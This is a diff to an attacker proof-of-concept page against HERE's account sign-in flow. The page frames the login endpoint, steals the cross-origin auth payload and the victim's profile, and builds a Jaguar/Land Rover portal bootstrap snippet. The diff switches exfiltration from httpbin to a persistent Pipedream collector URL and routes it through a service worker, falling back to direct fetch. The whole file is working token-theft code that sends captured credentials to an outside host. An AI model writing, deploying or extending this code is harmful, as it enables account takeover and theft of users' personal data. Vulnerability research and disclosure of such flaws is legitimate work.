@@ -130,10 +130,11 @@
       This attacker page frames <code>account.here.com/ssx-ec</code> with its own origin as the SDK
       callback <code>uri</code>. When HERE posts a sign-in completion payload cross-origin, the page
       steals the full auth object, reads the victim profile from <code>account.api.here.com/user/me</code>,
-      builds a ready Jaguar/Land Rover bootstrap snippet, and forwards the combined capture to <code>httpbin</code>.
+      builds a ready Jaguar/Land Rover bootstrap snippet, and forwards the combined capture to a persistent <code>Pipedream</code> collector.
     </p>
     <p id="status">Idle.</p>
     <p class="meta">Collector URL: <code id="collector-url"></code></p>
+    <p class="meta">Worker Status: <code id="worker-status">Not initialized</code></p>
     <button id="load-frame" type="button">Load Framed Flow</button>
     <button id="clear-log" type="button">Clear Log</button>
   </header>
@@ -148,26 +149,30 @@
         <pre id="log"></pre>
       </div>
       <div class="panel">
-        <h2>Collector Echo</h2>
-        <pre id="httpbin"></pre>
+        <h2>Collector Response</h2>
+        <pre id="collector-result"></pre>
       </div>
     </div>
   </main>
   <script>
     const logEl = document.getElementById("log");
-    const httpbinEl = document.getElementById("httpbin");
+    const collectorResultEl = document.getElementById("collector-result");
     const statusEl = document.getElementById("status");
     const frameWrap = document.getElementById("frame-wrap");
     const collectorUrlEl = document.getElementById("collector-url");
+    const workerStatusEl = document.getElementById("worker-status");
     const clientId = "YQijV3hAPdxySAVtE6ZT";
     const base = "https://account.here.com/ssx-ec";
-    const collectorUrl = "https://httpbin.org/anything/here-ssx-ec-sdk-exfil";
+    const collectorUrl = "https://eo3thijgx6t7lvh.m.pipedream.net";
     const state = {
       frameUrl: "",
       lastSensitiveKey: "",
       lastSensitiveCapture: null,
       lastCollectorResponse: null,
-      lastProfileFetch: null
+      lastCollectorRecord: null,
+      lastProfileFetch: null,
+      workerReady: null,
+      pendingCollectorRequests: new Map()
     };
 
     function stringify(value) {
@@ -188,6 +193,46 @@
       const line = `[${stamp}] ${label}\n${stringify(value)}\n\n`;
       logEl.textContent += line;
     }
+
+    function setWorkerStatus(message, isError = false) {
+      workerStatusEl.textContent = message;
+      workerStatusEl.style.color = isError ? "var(--danger)" : "var(--ink)";
+    }
+
+    async function registerCollectorWorker() {
+      if (!("serviceWorker" in navigator)) {
+        setWorkerStatus("Service worker unsupported. Falling back to direct page collector.", true);
+        appendLog("worker_status", "unsupported");
+        return null;
+      }
+
+      setWorkerStatus("Registering service worker...");
+      const registration = await navigator.serviceWorker.register("./sw.js", { scope: "./" });
+      await navigator.serviceWorker.ready;
+      setWorkerStatus(`Ready at scope ${registration.scope}`);
+      appendLog("worker_status", {
+        state: "ready",
+        scope: registration.scope
+      });
+      return registration;
+    }
+
+    navigator.serviceWorker?.addEventListener("message", (event) => {
+      const data = event.data || {};
+      if (data.type !== "collector_result" || !data.requestId) {
+        return;
+      }
+
+      const pending = state.pendingCollectorRequests.get(data.requestId);
+      if (!pending) {
+        appendLog("worker_message", data);
+        return;
+      }
+
+      clearTimeout(pending.timeoutId);
+      state.pendingCollectorRequests.delete(data.requestId);
+      pending.resolve(data.result);
+    });
 
     function buildUrl() {
       const params = new URLSearchParams({
@@ -310,7 +355,7 @@
       };
     }
 
-    async function postToCollector(body) {
+    async function postToCollectorDirect(body) {
       const response = await fetch(collectorUrl, {
         method: "POST",
         headers: {
@@ -330,6 +375,38 @@
       };
     }
 
+    async function postToCollector(body) {
+      const registration = await state.workerReady;
+      if (!registration || !registration.active) {
+        appendLog("worker_status", "missing active worker, using direct collector");
+        return postToCollectorDirect(body);
+      }
+
+      const requestId = crypto.randomUUID();
+      return new Promise((resolve) => {
+        const timeoutId = window.setTimeout(async () => {
+          state.pendingCollectorRequests.delete(requestId);
+          appendLog("worker_timeout", {
+            requestId,
+            reason: "service worker collector timed out, using direct collector"
+          });
+          resolve(await postToCollectorDirect(body));
+        }, 15000);
+
+        state.pendingCollectorRequests.set(requestId, {
+          resolve,
+          timeoutId
+        });
+
+        registration.active.postMessage({
+          type: "collector_capture",
+          requestId,
+          collectorUrl,
+          payload: body
+        });
+      });
+    }
+
     async function handleSensitiveMessage(event) {
       const extracted = extractAuthPayload(event.data);
       if (!extracted) {
@@ -346,7 +423,7 @@
       }
       state.lastSensitiveKey = key;
 
-      setStatus("Captured HERE auth payload. Reading victim profile, building the portal bootstrap snippet, and posting to httpbin.");
+      setStatus("Captured HERE auth payload. Reading victim profile, building the portal bootstrap snippet, and handing the payload to the service worker collector.");
       const profileFetch = await fetchProfile(extracted.auth);
       state.lastProfileFetch = profileFetch;
       const bootstrap = buildPortalBootstrapSnippet(extracted.auth, profileFetch);
@@ -370,9 +447,15 @@
 
       const collectorResponse = await postToCollector(sensitiveCapture);
       state.lastCollectorResponse = collectorResponse;
+      const collectorRecord = {
+        collectorResponse: collectorResponse.json || collectorResponse,
+        capturedPayload: sensitiveCapture
+      };
+      state.lastCollectorRecord = collectorRecord;
       window.lastCollectorResponse = collectorResponse;
-      httpbinEl.textContent = stringify(collectorResponse.json || collectorResponse);
-      appendLog("httpbin_response", collectorResponse.json || collectorResponse);
+      window.lastCollectorRecord = collectorRecord;
+      collectorResultEl.textContent = stringify(collectorRecord);
+      appendLog("collector_response", collectorRecord);
       setStatus(`Collector write completed with HTTP ${collectorResponse.status} to ${collectorUrl}.`, !collectorResponse.ok);
     }
 
@@ -395,20 +478,32 @@
     document.getElementById("load-frame").addEventListener("click", loadFrame);
     document.getElementById("clear-log").addEventListener("click", () => {
       logEl.textContent = "";
-      httpbinEl.textContent = "";
+      collectorResultEl.textContent = "";
       state.lastSensitiveKey = "";
       state.lastSensitiveCapture = null;
       state.lastCollectorResponse = null;
+      state.lastCollectorRecord = null;
       state.lastProfileFetch = null;
       window.lastSensitiveCapture = null;
       window.lastCollectorResponse = null;
+      window.lastCollectorRecord = null;
       window.lastProfileFetch = null;
     });
 
     collectorUrlEl.textContent = collectorUrl;
+    state.workerReady = registerCollectorWorker().catch((error) => {
+      setWorkerStatus(`Registration failed: ${String(error)}`, true);
+      appendLog("worker_status", {
+        state: "failed",
+        message: String(error),
+        stack: error && error.stack
+      });
+      return null;
+    });
     appendLog("page_origin", window.location.origin);
     appendLog("collector_url", collectorUrl);
     loadFrame();
   </script>
 </body>
+</html>
 </html>
